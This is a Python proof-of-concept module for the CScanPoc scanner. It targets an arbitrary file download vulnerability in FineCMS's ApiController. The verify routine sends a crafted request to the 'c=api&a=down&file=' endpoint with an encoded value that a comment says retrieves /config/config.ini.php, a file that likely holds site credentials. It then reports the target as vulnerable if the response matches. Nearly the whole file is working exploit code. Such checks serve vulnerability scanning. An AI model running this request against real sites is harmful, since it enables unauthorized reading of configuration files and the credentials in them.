# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'FineCMS_0011'  # 平台漏洞编号，留空
    name = 'FineCMS 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2016-12-24'  # 漏洞公布时间
    desc = '''
        FineCMS \controllers\ApiController.php Line 54 $file 可控导致产生漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4198/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FineCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '93a9d322-6207-4dea-bbf5-f15cf6c721db'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/index.php?c=api&a=down&file='
            # /config/config.ini.php
            data = 'NDgwNTA0M2RFRXRkc1ZTaGNuczJBSjZTSk9KSDVTYnFqL251K0lNRjBQK0tla0FBTVpHM3dLbU8yVTNWaE1SYTRtRXRjUlQ3bDd4cGRQeVRKMGVlcDEvQjNRVlA4bTNnMi9SZDRDSjBOUQ'
            url = self.target + payload + data
            r = requests.get(url)

            if "config.ini.php" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
